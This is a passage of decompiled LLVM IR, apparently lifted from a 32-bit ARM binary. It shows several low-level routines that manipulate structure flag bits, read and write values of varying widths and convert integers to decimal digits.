  br label %dec_label_pc_11360

dec_label_pc_11360:                               ; preds = %bb13, %dec_label_pc_112e4, %dec_label_pc_112d4, %dec_label_pc_112bc, %dec_label_pc_11298, %dec_label_pc_11310, %bb10, %dec_label_pc_1134c
  %v0_11360 = load i32, i32* @r6, align 4
  %v2_11364 = load i32, i32* %stack_var_-20, align 4
  store i32 %v2_11364, i32* @r4, align 4
  store i32 %v6_11230, i32* @r5, align 4
  store i32 %v9_11230, i32* @r6, align 4
  store i32 %v12_11230, i32* @r7, align 4
  ret i32 %v0_11360

; uselistorder directives
  uselistorder i32 %v2_11318, { 1, 0 }
  uselistorder i32 %v2_112f0, { 1, 0 }
  uselistorder i32 %v0_112d8.v0_112e4, { 1, 2, 0, 3 }
  uselistorder i32 %v0_112e4, { 1, 0, 2 }
  uselistorder i32 %v2_11264, { 2, 0, 1, 3 }
  uselistorder i32 %v9_11230, { 1, 0 }
  uselistorder i32* %stack_var_-20, { 1, 0, 2 }
  uselistorder i32* %r7.global-to-local, { 2, 0, 1, 3, 4, 5 }
  uselistorder i32 %arg3, { 0, 1, 5, 6, 4, 3, 8, 2, 7 }
  uselistorder i32 %arg2, { 3, 4, 5, 2, 0, 1, 6, 7 }
  uselistorder i32 %arg1, { 0, 1, 3, 2, 4 }
  uselistorder label %dec_label_pc_11360, { 7, 0, 5, 1, 2, 3, 4, 6 }
  uselistorder label %dec_label_pc_1134c, { 0, 2, 1 }
  uselistorder label %bb10, { 1, 0 }
}

define i32 @function_11368(i8* %arg1, i32 %arg2) local_unnamed_addr {
dec_label_pc_11368:
  %cpsr_z.global-to-local = alloca i1, align 1
  %r0.global-to-local = alloca i32, align 4
  %r1.global-to-local = alloca i32, align 4
  %r2.global-to-local = alloca i32, align 4
  %r3.global-to-local = alloca i32, align 4
  store i32 %arg2, i32* %r1.global-to-local, align 4
  %tmp = ptrtoint i8* %arg1 to i32
  store i32 %tmp, i32* @r0, align 4
  %stack_var_-8 = alloca i32, align 4
  %v3_11368 = load i32, i32* @r4, align 4
  store i32 %v3_11368, i32* %stack_var_-8, align 4
  %v3_1136c = load i8, i8* %arg1, align 1
  %v4_1136c = zext i8 %v3_1136c to i32
  store i32 %v4_1136c, i32* %r2.global-to-local, align 4
  %v2_11370 = add i32 %tmp, 1
  %v3_11370 = inttoptr i32 %v2_11370 to i8*
  %v4_11370 = load i8, i8* %v3_11370, align 1
  %v5_11370 = zext i8 %v4_11370 to i32
  store i32 %v5_11370, i32* %r3.global-to-local, align 4
  %v4_11374 = mul nuw nsw i32 %v5_11370, 256
  %v5_11374 = or i32 %v4_11374, %v4_1136c
  store i32 %v5_11374, i32* %r2.global-to-local, align 4
  %v2_11378 = and i32 %v5_11374, %arg2
  %v4_11378 = icmp eq i32 %v2_11378, 0
  store i1 %v4_11378, i1* %cpsr_z.global-to-local, align 1
  store i32 %tmp, i32* @r4, align 4
  br i1 %v4_11378, label %dec_label_pc_11384, label %dec_label_pc_1139c

dec_label_pc_11384:                               ; preds = %dec_label_pc_11368
  %v1_11384 = and i32 %v5_11374, 2176
  %v2_11384 = icmp eq i32 %v1_11384, 0
  store i1 %v2_11384, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_11384, label %dec_label_pc_1138c, label %dec_label_pc_113b0

dec_label_pc_1138c:                               ; preds = %dec_label_pc_11384
  %v2_1138c = or i32 %v5_11374, %arg2
  store i32 %v2_1138c, i32* %r2.global-to-local, align 4
  %v3_11390 = sdiv i32 %v2_1138c, 256
  store i32 %v3_11390, i32* %r3.global-to-local, align 4
  %v1_11394 = trunc i32 %v3_11390 to i8
  store i8 %v1_11394, i8* %v3_11370, align 1
  %v0_11398 = load i32, i32* %r2.global-to-local, align 4
  %v1_11398 = trunc i32 %v0_11398 to i8
  store i8 %v1_11398, i8* %arg1, align 1
  %v0_1139c.pre = load i32, i32* @r4, align 4
  br label %dec_label_pc_1139c

dec_label_pc_1139c:                               ; preds = %dec_label_pc_11368, %dec_label_pc_1138c
  %v0_113e8 = phi i32 [ %tmp, %dec_label_pc_11368 ], [ %v0_1139c.pre, %dec_label_pc_1138c ]
  %v1_1139c = inttoptr i32 %v0_113e8 to i8*
  %v2_1139c = load i8, i8* %v1_1139c, align 1
  %v3_1139c = zext i8 %v2_1139c to i32
  store i32 %v3_1139c, i32* %r2.global-to-local, align 4
  %v1_113a0 = add i32 %v0_113e8, 1
  %v2_113a0 = inttoptr i32 %v1_113a0 to i8*
  %v3_113a0 = load i8, i8* %v2_113a0, align 1
  %v4_113a0 = zext i8 %v3_113a0 to i32
  store i32 %v4_113a0, i32* %r3.global-to-local, align 4
  %v4_113a4 = mul nuw nsw i32 %v4_113a0, 256
  %v5_113a4 = or i32 %v4_113a4, %v3_1139c
  store i32 %v5_113a4, i32* @ip, align 4
  %v1_113a8 = and i32 %v3_1139c, 32
  %v2_113a8 = icmp eq i32 %v1_113a8, 0
  store i1 %v2_113a8, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_113a8, label %dec_label_pc_113d8, label %dec_label_pc_113b0

dec_label_pc_113b0:                               ; preds = %dec_label_pc_11384, %dec_label_pc_1139c
  %v0_113b0 = call i32 @function_cc08()
  store i32 %v0_113b0, i32* %r0.global-to-local, align 4
  store i32 9, i32* %r3.global-to-local, align 4
  %v2_113b8 = inttoptr i32 %v0_113b0 to i32*
  store i32 9, i32* %v2_113b8, align 4
  br label %dec_label_pc_113bc

dec_label_pc_113bc:                               ; preds = %dec_label_pc_11400, %dec_label_pc_113b0
  %v0_113bc = load i32, i32* @r4, align 4
  %v1_113bc = inttoptr i32 %v0_113bc to i32*
  %v2_113bc = load i32, i32* %v1_113bc, align 4
  %v1_113c0 = or i32 %v2_113bc, 8
  store i32 %v1_113c0, i32* %r3.global-to-local, align 4
  %v3_113c4 = sdiv i32 %v2_113bc, 256
  store i32 %v3_113c4, i32* %r2.global-to-local, align 4
  store i32 -1, i32* %r0.global-to-local, align 4
  %v1_113cc = trunc i32 %v3_113c4 to i8
  %v3_113cc = add i32 %v0_113bc, 1
  %v4_113cc = inttoptr i32 %v3_113cc to i8*
  store i8 %v1_113cc, i8* %v4_113cc, align 1
  %v0_113d0 = load i32, i32* %r3.global-to-local, align 4
  %v1_113d0 = trunc i32 %v0_113d0 to i8
  %v2_113d0 = load i32, i32* @r4, align 4
  %v3_113d0 = inttoptr i32 %v2_113d0 to i8*
  store i8 %v1_113d0, i8* %v3_113d0, align 1
  %v2_113d4 = load i32, i32* %stack_var_-8, align 4
  store i32 %v2_113d4, i32* @r4, align 4
  ret i32 -1

dec_label_pc_113d8:                               ; preds = %dec_label_pc_1139c
  %tmp15 = urem i8 %v2_1139c, 4
  %v2_113d8 = icmp eq i8 %tmp15, 0
  store i1 %v2_113d8, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_113d8, label %dec_label_pc_1143c, label %dec_label_pc_113e0

dec_label_pc_113e0:                               ; preds = %dec_label_pc_113d8
  %v1_113e0 = and i32 %v3_1139c, 4
  store i32 %v1_113e0, i32* @r1, align 4
  %v2_113e0 = icmp eq i32 %v1_113e0, 0
  store i1 %v2_113e0, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_113e0, label %dec_label_pc_113e8, label %dec_label_pc_11418

dec_label_pc_113e8:                               ; preds = %dec_label_pc_113e0
  %v1_113e8 = add i32 %v0_113e8, 20
  %v2_113e8 = inttoptr i32 %v1_113e8 to i32*
  %v3_113e8 = load i32, i32* %v2_113e8, align 4
  store i32 %v3_113e8, i32* %r2.global-to-local, align 4
  %v1_113ec = add i32 %v0_113e8, 16
  %v2_113ec = inttoptr i32 %v1_113ec to i32*
  %v3_113ec = load i32, i32* %v2_113ec, align 4
  store i32 %v3_113ec, i32* %r3.global-to-local, align 4
  %v9_113f0 = icmp eq i32 %v3_113e8, %v3_113ec
  store i1 %v9_113f0, i1* %cpsr_z.global-to-local, align 1
  br i1 %v9_113f0, label %dec_label_pc_113f8, label %dec_label_pc_11400

dec_label_pc_113f8:                               ; preds = %dec_label_pc_113e8
  %v1_113f8 = and i32 %v3_1139c, 2
  %v2_113f8 = icmp eq i32 %v1_113f8, 0
  store i1 %v2_113f8, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_113f8, label %dec_label_pc_11418, label %dec_label_pc_11400

dec_label_pc_11400:                               ; preds = %dec_label_pc_113e8, %dec_label_pc_113f8
  %v1_11400 = and i32 %v4_113a4, 1024
  %v2_11400 = icmp eq i32 %v1_11400, 0
  store i1 %v2_11400, i1* %cpsr_z.global-to-local, align 1
  %tmp13 = udiv i32 %v1_11400, 1024
  %tmp14 = add nuw nsw i32 %tmp13, 1
  store i32 %tmp14, i32* @r2, align 4
  %v0_1140c = call i32 @function_13450()
  store i32 %v0_1140c, i32* %r0.global-to-local, align 4
  %v2_11410 = icmp eq i32 %v0_1140c, 0
  store i1 %v2_11410, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_11410, label %.dec_label_pc_11418_crit_edge, label %dec_label_pc_113bc

.dec_label_pc_11418_crit_edge:                    ; preds = %dec_label_pc_11400
  %v0_11418.pre = load i32, i32* @r4, align 4
  br label %dec_label_pc_11418

dec_label_pc_11418:                               ; preds = %.dec_label_pc_11418_crit_edge, %dec_label_pc_113e0, %dec_label_pc_113f8
  %v2_11428 = phi i32 [ %v0_11418.pre, %.dec_label_pc_11418_crit_edge ], [ %v0_113e8, %dec_label_pc_113e0 ], [ %v0_113e8, %dec_label_pc_113f8 ]
  %v1_11418 = inttoptr i32 %v2_11428 to i32*
  %v2_11418 = load i32, i32* %v1_11418, align 4
  store i32 %v2_11418, i32* %r3.global-to-local, align 4
  %v1_1141c = add i32 %v2_11428, 8
  %v2_1141c = inttoptr i32 %v1_1141c to i32*
  %v3_1141c = load i32, i32* %v2_1141c, align 4
  store i32 %v3_1141c, i32* %r1.global-to-local, align 4
  %v1_11420 = and i32 %v2_11418, -4
  store i32 %v1_11420, i32* %r3.global-to-local, align 4
  %v3_11424 = sdiv i32 %v2_11418, 256
  store i32 %v3_11424, i32* %r2.global-to-local, align 4
  %v1_11428 = trunc i32 %v3_11424 to i8
  %v3_11428 = add i32 %v2_11428, 1
  %v4_11428 = inttoptr i32 %v3_11428 to i8*
  store i8 %v1_11428, i8* %v4_11428, align 1
  %v0_1142c = load i32, i32* %r1.global-to-local, align 4
  %v1_1142c = load i32, i32* @r4, align 4
  %v2_1142c = add i32 %v1_1142c, 20
  %v3_1142c = inttoptr i32 %v2_1142c to i32*
  store i32 %v0_1142c, i32* %v3_1142c, align 4
  %v0_11430 = load i32, i32* %r3.global-to-local, align 4
  %v1_11430 = trunc i32 %v0_11430 to i8
  %v2_11430 = load i32, i32* @r4, align 4
  %v3_11430 = inttoptr i32 %v2_11430 to i8*
  store i8 %v1_11430, i8* %v3_11430, align 1
  %v0_11434 = load i32, i32* %r1.global-to-local, align 4
  %v1_11434 = load i32, i32* @r4, align 4
  %v2_11434 = add i32 %v1_11434, 24
  %v3_11434 = inttoptr i32 %v2_11434 to i32*
  store i32 %v0_11434, i32* %v3_11434, align 4
  %v0_11438 = load i32, i32* %r1.global-to-local, align 4
  %v1_11438 = load i32, i32* @r4, align 4
  %v2_11438 = add i32 %v1_11438, 16
  %v3_11438 = inttoptr i32 %v2_11438 to i32*
  store i32 %v0_11438, i32* %v3_11438, align 4
  %v0_1143c.pre = load i32, i32* @r4, align 4
  br label %dec_label_pc_1143c

dec_label_pc_1143c:                               ; preds = %dec_label_pc_113d8, %dec_label_pc_11418
  %v2_11448 = phi i32 [ %v0_113e8, %dec_label_pc_113d8 ], [ %v0_1143c.pre, %dec_label_pc_11418 ]
  %v1_1143c = inttoptr i32 %v2_11448 to i32*
  %v2_1143c = load i32, i32* %v1_1143c, align 4
  %v1_11440 = or i32 %v2_1143c, 64
  store i32 %v1_11440, i32* %r2.global-to-local, align 4
  %v3_11444 = sdiv i32 %v2_1143c, 256
  store i32 %v3_11444, i32* %r3.global-to-local, align 4
  %v1_11448 = trunc i32 %v3_11444 to i8
  %v3_11448 = add i32 %v2_11448, 1
  %v4_11448 = inttoptr i32 %v3_11448 to i8*
  store i8 %v1_11448, i8* %v4_11448, align 1
  %v0_1144c = load i32, i32* @r4, align 4
  %v1_1144c = add i32 %v0_1144c, 1
  %v2_1144c = inttoptr i32 %v1_1144c to i8*
  %v3_1144c = load i8, i8* %v2_1144c, align 1
  %v4_1144c = zext i8 %v3_1144c to i32
  %v3_11450 = mul nuw nsw i32 %v4_1144c, 256
  store i32 %v3_11450, i32* %r3.global-to-local, align 4
  %v1_11454 = and i32 %v3_11450, 2816
  store i32 %v1_11454, i32* %r0.global-to-local, align 4
  %v2_11454 = icmp eq i32 %v1_11454, 0
  store i1 %v2_11454, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_11454, label %bb9, label %.thread1

bb9:                                              ; preds = %dec_label_pc_1143c
  %v2_11458 = add i32 %v0_1144c, 12
  %v3_11458 = inttoptr i32 %v2_11458 to i32*
  %v4_11458 = load i32, i32* %v3_11458, align 4
  store i32 %v4_11458, i32* %r3.global-to-local, align 4
  br label %bb10

.thread1:                                         ; preds = %dec_label_pc_1143c
  store i32 0, i32* %r0.global-to-local, align 4
  br label %bb10

bb10:                                             ; preds = %bb9, %.thread1
  %v0_11460 = load i32, i32* %r2.global-to-local, align 4
  %v1_11460 = trunc i32 %v0_11460 to i8
  %v3_11460 = inttoptr i32 %v0_1144c to i8*
  store i8 %v1_11460, i8* %v3_11460, align 1
  %v0_11464 = load i1, i1* %cpsr_z.global-to-local, align 1
  br i1 %v0_11464, label %bb11, label %bb12

bb11:                                             ; preds = %bb10
  %v1_11464 = load i32, i32* %r3.global-to-local, align 4
  %v2_11464 = load i32, i32* @r4, align 4
  %v3_11464 = add i32 %v2_11464, 28
  %v4_11464 = inttoptr i32 %v3_11464 to i32*
  store i32 %v1_11464, i32* %v4_11464, align 4
  br label %bb12

bb12:                                             ; preds = %bb10, %bb11
  %v2_11468 = load i32, i32* %stack_var_-8, align 4
  store i32 %v2_11468, i32* @r4, align 4
  %v8_11468 = load i32, i32* %r0.global-to-local, align 4
  ret i32 %v8_11468

; uselistorder directives
  uselistorder i32 %v3_11450, { 1, 0 }
  uselistorder i32 %v3_11444, { 1, 0 }
  uselistorder i32 %v3_11424, { 1, 0 }
  uselistorder i32 %v2_11428, { 0, 2, 1 }
  uselistorder i1 %v2_113d8, { 1, 0 }
  uselistorder i32 %v3_113c4, { 1, 0 }
  uselistorder i32 %v3_1139c, { 1, 2, 3, 0, 4 }
  uselistorder i32 %v0_113e8, { 0, 1, 2, 4, 3, 6, 5 }
  uselistorder i32 %v3_11390, { 1, 0 }
  uselistorder i32 %v5_11374, { 0, 2, 1, 3 }
  uselistorder i32* %r3.global-to-local, { 1, 0, 2, 3, 4, 5, 6, 7, 8, 9, 10, 11, 12, 13 }
  uselistorder i32* %r1.global-to-local, { 1, 2, 3, 4, 0 }
  uselistorder i32* %r0.global-to-local, { 2, 1, 3, 0, 4, 5 }
  uselistorder i8* %arg1, { 1, 0, 2 }
  uselistorder label %bb12, { 1, 0 }
  uselistorder label %bb10, { 1, 0 }
  uselistorder label %dec_label_pc_1143c, { 1, 0 }
  uselistorder label %dec_label_pc_11418, { 0, 2, 1 }
  uselistorder label %dec_label_pc_11400, { 1, 0 }
  uselistorder label %dec_label_pc_113b0, { 1, 0 }
  uselistorder label %dec_label_pc_1139c, { 1, 0 }
}

define i32 @function_1146c() local_unnamed_addr {
dec_label_pc_1146c:
  %v0_1146c = load i32, i32* @r2, align 4
  %v1_1146c = icmp slt i32 %v0_1146c, 0
  %v0_11470 = load i32, i32* @r0, align 4
  %v1_11474 = and i32 %v0_11470, 2048
  %v2_114a8 = icmp eq i32 %v1_11474, 0
  br i1 %v1_1146c, label %dec_label_pc_114a8, label %dec_label_pc_1147c

dec_label_pc_1147c:                               ; preds = %dec_label_pc_1146c
  br i1 %v2_114a8, label %dec_label_pc_11484, label %dec_label_pc_114b0

dec_label_pc_11484:                               ; preds = %dec_label_pc_1147c
  %v7_11484 = icmp eq i32 %v0_11470, 256
  %v0_11488 = load i32, i32* @r1, align 4
  %v1_11488 = inttoptr i32 %v0_11488 to i32*
  %v2_11488 = load i32, i32* %v1_11488, align 4
  %v2_1148c = urem i32 %v2_11488, 256
  %v2_1148c.v2_11488 = select i1 %v7_11484, i32 %v2_1148c, i32 %v2_11488
  br i1 %v7_11484, label %.thread, label %dec_label_pc_11494

dec_label_pc_11494:                               ; preds = %dec_label_pc_11484
  %v7_11494 = icmp eq i32 %v0_11470, 512
  br i1 %v7_11494, label %bb, label %.thread

bb:                                               ; preds = %dec_label_pc_11494
  %v4_1149c = urem i32 %v2_1148c.v2_11488, 65536
  br label %.thread

.thread:                                          ; preds = %dec_label_pc_11494, %dec_label_pc_11484, %bb
  %v1_114a4 = phi i32 [ %v2_11488, %dec_label_pc_11494 ], [ %v2_1148c, %dec_label_pc_11484 ], [ %v4_1149c, %bb ]
  store i32 0, i32* @r1, align 4
  ret i32 %v1_114a4

dec_label_pc_114a8:                               ; preds = %dec_label_pc_1146c
  br i1 %v2_114a8, label %dec_label_pc_114b8, label %dec_label_pc_114b0

dec_label_pc_114b0:                               ; preds = %dec_label_pc_1147c, %dec_label_pc_114a8
  %v0_114b0 = load i32, i32* @r1, align 4
  %v1_114b0 = inttoptr i32 %v0_114b0 to i32*
  %v2_114b0 = load i32, i32* %v1_114b0, align 4
  %v3_114b0 = add i32 %v0_114b0, 4
  %v4_114b0 = inttoptr i32 %v3_114b0 to i32*
  %v5_114b0 = load i32, i32* %v4_114b0, align 4
  store i32 %v5_114b0, i32* @r1, align 4
  ret i32 %v2_114b0

dec_label_pc_114b8:                               ; preds = %dec_label_pc_114a8
  %v7_114b8 = icmp eq i32 %v0_11470, 256
  %v0_114bc = load i32, i32* @r1, align 4
  %v1_114bc = inttoptr i32 %v0_114bc to i32*
  %v2_114bc = load i32, i32* %v1_114bc, align 4
  %v2_114c0 = urem i32 %v2_114bc, 256
  %v2_114c0.v2_114bc = select i1 %v7_114b8, i32 %v2_114c0, i32 %v2_114bc
  br i1 %v7_114b8, label %.thread2, label %dec_label_pc_114c8

dec_label_pc_114c8:                               ; preds = %dec_label_pc_114b8
  %v7_114c8 = icmp eq i32 %v0_11470, 512
  br i1 %v7_114c8, label %bb5, label %.thread2

bb5:                                              ; preds = %dec_label_pc_114c8
  %v4_114cc = mul i32 %v2_114c0.v2_114bc, 65536
  %v4_114d0 = sdiv i32 %v4_114cc, 65536
  br label %.thread2

.thread2:                                         ; preds = %dec_label_pc_114c8, %dec_label_pc_114b8, %bb5
  %v0_114d4 = phi i32 [ %v2_114bc, %dec_label_pc_114c8 ], [ %v2_114c0, %dec_label_pc_114b8 ], [ %v4_114d0, %bb5 ]
  %v3_114d4 = ashr i32 %v0_114d4, 31
  store i32 %v3_114d4, i32* @r1, align 4
  ret i32 %v0_114d4

; uselistorder directives
  uselistorder i32 %v0_114d4, { 1, 0 }
  uselistorder i32 %v2_114c0, { 1, 0 }
  uselistorder i32 %v2_114bc, { 1, 2, 0 }
  uselistorder i32 %v2_1148c, { 1, 0 }
  uselistorder i32 %v2_11488, { 1, 2, 0 }
  uselistorder i1 %v2_114a8, { 1, 0 }
  uselistorder label %.thread2, { 2, 0, 1 }
  uselistorder label %dec_label_pc_114b0, { 1, 0 }
  uselistorder label %.thread, { 2, 0, 1 }
}

define i32 @function_114dc(i8* %arg1, i32 %arg2, i32 %arg3, i32 %arg4) local_unnamed_addr {
dec_label_pc_114dc:
  %tmp = trunc i32 %arg3 to i8
  %tmp2 = ptrtoint i8* %arg1 to i32
  %v7_114dc = icmp eq i32 %arg2, 256
  br i1 %v7_114dc, label %dec_label_pc_11508, label %dec_label_pc_114e4

dec_label_pc_114e4:                               ; preds = %dec_label_pc_114dc
  %v7_114e4 = icmp eq i32 %arg2, 2048
  br i1 %v7_114e4, label %dec_label_pc_114ec, label %dec_label_pc_114f4

dec_label_pc_114ec:                               ; preds = %dec_label_pc_114e4
  %tmp3 = bitcast i8* %arg1 to i32*
  store i32 %arg3, i32* %tmp3, align 4
  %v5_114ec = add i32 %tmp2, 4
  %v6_114ec = inttoptr i32 %v5_114ec to i32*
  store i32 %arg4, i32* %v6_114ec, align 4
  ret i32 %tmp2

dec_label_pc_114f4:                               ; preds = %dec_label_pc_114e4
  %v7_114f4 = icmp eq i32 %arg2, 512
  %v4_114f8 = sdiv i32 %arg3, 256
  store i32 %v4_114f8, i32* @ip, align 4
  br i1 %v7_114f4, label %.thread, label %bb

bb:                                               ; preds = %dec_label_pc_114f4
  %tmp4 = bitcast i8* %arg1 to i32*
  store i32 %arg3, i32* %tmp4, align 4
  ret i32 %tmp2

.thread:                                          ; preds = %dec_label_pc_114f4
  %v1_11504 = trunc i32 %v4_114f8 to i8
  %v4_11504 = add i32 %tmp2, 1
  %v5_11504 = inttoptr i32 %v4_11504 to i8*
  store i8 %v1_11504, i8* %v5_11504, align 1
  br label %dec_label_pc_11508

dec_label_pc_11508:                               ; preds = %dec_label_pc_114dc, %.thread
  store i8 %tmp, i8* %arg1, align 1
  ret i32 %tmp2

; uselistorder directives
  uselistorder i32 %v4_114f8, { 1, 0 }
  uselistorder i32 %tmp2, { 4, 1, 0, 2, 3 }
  uselistorder i32 %arg3, { 1, 0, 2, 3 }
  uselistorder i8* %arg1, { 2, 0, 1, 3 }
  uselistorder label %dec_label_pc_11508, { 1, 0 }
}

define i32 @function_11510(i8* %arg1, i32 %arg2, i32 %arg3, i32 %arg4, i32 %arg5) local_unnamed_addr {
dec_label_pc_11510:
  %cpsr_z.global-to-local = alloca i1, align 1
  %fp.global-to-local = alloca i32, align 4
  %r4.global-to-local = alloca i32, align 4
  %r5.global-to-local = alloca i32, align 4
  %r6.global-to-local = alloca i32, align 4
  %r7.global-to-local = alloca i32, align 4
  %r8.global-to-local = alloca i32, align 4
  %sb.global-to-local = alloca i32, align 4
  %sl.global-to-local = alloca i32, align 4
  %tmp = ptrtoint i8* %arg1 to i32
  %stack_var_0 = alloca i32, align 4
  store i32 %arg5, i32* %stack_var_0, align 4
  %stack_var_-40 = alloca i8, align 1
  store i32 %arg4, i32* %r7.global-to-local, align 4
  %v1_11514 = icmp slt i32 %arg4, 0
  %v2_11514 = icmp eq i32 %arg4, 0
  store i1 %v2_11514, i1* %cpsr_z.global-to-local, align 1
  store i32 %tmp, i32* %r8.global-to-local, align 4
  store i32 %arg2, i32* %r5.global-to-local, align 4
  store i32 %arg3, i32* %r6.global-to-local, align 4
  br i1 %v1_11514, label %dec_label_pc_1152c, label %dec_label_pc_1154c

dec_label_pc_1152c:                               ; preds = %dec_label_pc_11510
  %v1_1152c = icmp slt i32 %arg3, 0
  %v2_1152c = icmp eq i32 %arg3, 0
  store i1 %v2_1152c, i1* %cpsr_z.global-to-local, align 1
  %v1_11530 = sub i32 0, %arg4
  store i32 %v1_11530, i32* %r7.global-to-local, align 4
  br i1 %v1_1152c, label %dec_label_pc_11538, label %dec_label_pc_1154c

dec_label_pc_11538:                               ; preds = %dec_label_pc_1152c
  %v1_1153c = sub i32 0, %arg2
  store i32 %v1_1153c, i32* %r5.global-to-local, align 4
  %v2_1153c = icmp eq i32 %arg2, 0
  %v2_11540 = icmp eq i1 %v2_1153c, false
  %v5_11540 = sext i1 %v2_11540 to i32
  %v6_11540 = sub i32 %v5_11540, %arg3
  store i32 %v6_11540, i32* %r6.global-to-local, align 4
  %v19_11540 = icmp eq i32 %v6_11540, 0
  store i1 %v19_11540, i1* %cpsr_z.global-to-local, align 1
  br label %dec_label_pc_11554

dec_label_pc_1154c:                               ; preds = %dec_label_pc_1152c, %dec_label_pc_11510
  br label %dec_label_pc_11554

dec_label_pc_11554:                               ; preds = %dec_label_pc_11538, %dec_label_pc_1154c
  %storemerge = phi i8 [ 0, %dec_label_pc_1154c ], [ 1, %dec_label_pc_11538 ]
  store i8 %storemerge, i8* %stack_var_-40, align 1
  store i32 0, i32* %sl.global-to-local, align 4
  store i8 0, i8* %arg1, align 1
  %v0_1155c = load i32, i32* %r7.global-to-local, align 4
  store i32 %v0_1155c, i32* @r1, align 4
  store i32 -1, i32* @r0, align 4
  %v0_11564 = call i32 @function_14a34()
  store i32 %v0_11564, i32* %fp.global-to-local, align 4
  %v2_11574 = call i32 @function_c864(i32 -1, i32 %v0_1155c)
  %v1_11578 = add i32 %v2_11574, 1
  store i32 %v1_11578, i32* %sb.global-to-local, align 4
  %v1_1157c = load i32, i32* %r7.global-to-local, align 4
  %v9_1157c = icmp eq i32 %v1_11578, %v1_1157c
  store i1 %v9_1157c, i1* %cpsr_z.global-to-local, align 1
  br i1 %v9_1157c, label %bb, label %.thread

bb:                                               ; preds = %dec_label_pc_11554
  %v1_11580 = load i32, i32* %sl.global-to-local, align 4
  store i32 %v1_11580, i32* %sb.global-to-local, align 4
  %v1_11584 = load i32, i32* %fp.global-to-local, align 4
  %v2_11584 = add i32 %v1_11584, 1
  store i32 %v2_11584, i32* %fp.global-to-local, align 4
  br label %.thread

.thread:                                          ; preds = %dec_label_pc_11554, %bb
  %v0_11588 = load i32, i32* %r6.global-to-local, align 4
  store i32 %v0_11588, i32* %sl.global-to-local, align 4
  %v0_1158c = load i32, i32* %r5.global-to-local, align 4
  store i32 %v0_1158c, i32* %r6.global-to-local, align 4
  br label %dec_label_pc_11590

dec_label_pc_11590thread-pre-split:               ; preds = %bb19
  %v0_11590.pr = load i32, i32* %sl.global-to-local, align 4
  %v0_11598.pre = load i32, i32* %r7.global-to-local, align 4
  br label %dec_label_pc_11590

dec_label_pc_11590:                               ; preds = %dec_label_pc_11590thread-pre-split, %.thread
  %v0_11600 = phi i32 [ %v0_11598.pre, %dec_label_pc_11590thread-pre-split ], [ %v1_1157c, %.thread ]
  %v0_11594 = phi i32 [ %v0_11590.pr, %dec_label_pc_11590thread-pre-split ], [ %v0_11588, %.thread ]
  %v2_11590 = icmp eq i32 %v0_11594, 0
  store i1 %v2_11590, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_11590, label %dec_label_pc_115fc, label %dec_label_pc_115a0

dec_label_pc_115a0:                               ; preds = %dec_label_pc_11590
  %v2_115a0 = call i32 @function_c864(i32 %v0_11594, i32 %v0_11600)
  %v0_115a4 = load i32, i32* %r7.global-to-local, align 4
  store i32 %v0_115a4, i32* @r1, align 4
  store i32 %v2_115a0, i32* %r4.global-to-local, align 4
  %v0_115ac = load i32, i32* %sl.global-to-local, align 4
  store i32 %v0_115ac, i32* @r0, align 4
  %v0_115b0 = call i32 @function_14a34()
  store i32 %v0_115b0, i32* %sl.global-to-local, align 4
  %v0_115bc = load i32, i32* %r6.global-to-local, align 4
  %v2_115c0 = call i32 @function_c864(i32 %v0_115bc, i32 %v0_115a4)
  %v0_115c4 = load i32, i32* %r7.global-to-local, align 4
  store i32 %v0_115c4, i32* @r1, align 4
  %v0_115c8 = load i32, i32* %r4.global-to-local, align 4
  %v1_115c8 = load i32, i32* %sb.global-to-local, align 4
  %v3_115c8 = mul i32 %v1_115c8, %v0_115c8
  %v4_115c8 = add i32 %v3_115c8, %v2_115c0
  store i32 %v4_115c8, i32* %r5.global-to-local, align 4
  %v0_115cc = load i32, i32* %r6.global-to-local, align 4
  store i32 %v0_115cc, i32* @r0, align 4
  %v0_115d0 = call i32 @function_14a34()
  %v0_115d4 = load i32, i32* %r7.global-to-local, align 4
  store i32 %v0_115d4, i32* @r1, align 4
  %v0_115d8 = load i32, i32* %fp.global-to-local, align 4
  %v1_115d8 = load i32, i32* %r4.global-to-local, align 4
  %v3_115d8 = mul i32 %v1_115d8, %v0_115d8
  %v4_115d8 = add i32 %v3_115d8, %v0_115d0
  store i32 %v4_115d8, i32* %r4.global-to-local, align 4
  %v0_115dc = load i32, i32* %r5.global-to-local, align 4
  store i32 %v0_115dc, i32* @r0, align 4
  %v0_115e0 = call i32 @function_14a34()
  %v0_115e4 = load i32, i32* %r7.global-to-local, align 4
  %v2_115e8 = add i32 %v4_115d8, %v0_115e0
  store i32 %v2_115e8, i32* %r6.global-to-local, align 4
  %v2_115f0 = call i32 @function_c864(i32 %v0_115dc, i32 %v0_115e4)
  store i32 %v2_115f0, i32* %r4.global-to-local, align 4
  br label %dec_label_pc_1161c

dec_label_pc_115fc:                               ; preds = %dec_label_pc_11590
  %v0_115fc = load i32, i32* %r6.global-to-local, align 4
  %v2_11604 = call i32 @function_c864(i32 %v0_115fc, i32 %v0_11600)
  %v0_11608 = load i32, i32* %r7.global-to-local, align 4
  store i32 %v0_11608, i32* @r1, align 4
  store i32 %v2_11604, i32* %r4.global-to-local, align 4
  store i32 %v0_115fc, i32* @r0, align 4
  %v0_11614 = call i32 @function_14a34()
  store i32 %v0_11614, i32* %r6.global-to-local, align 4
  br label %dec_label_pc_1161c

dec_label_pc_1161c:                               ; preds = %dec_label_pc_115a0, %dec_label_pc_115fc
  %v0_11624 = phi i32 [ %v2_115f0, %dec_label_pc_115a0 ], [ %v2_11604, %dec_label_pc_115fc ]
  %v3_1161c = load i32, i32* %stack_var_0, align 4
  %v2_11620 = icmp ugt i32 %v0_11624, 8
  %v7_11620 = icmp eq i32 %v0_11624, 9
  store i1 %v7_11620, i1* %cpsr_z.global-to-local, align 1
  %v1_11628 = add i32 %v0_11624, 48
  %v0_11630 = load i32, i32* %r8.global-to-local, align 4
  %v1_11630 = add i32 %v0_11630, -1
  store i32 %v1_11630, i32* %r8.global-to-local, align 4
  %v2_11634 = xor i1 %v7_11620, true
  %v3_11634 = and i1 %v2_11620, %v2_11634
  %extract.t = trunc i32 %v1_11628 to i8
  br i1 %v3_11634, label %bb18, label %bb19

bb18:                                             ; preds = %dec_label_pc_1161c
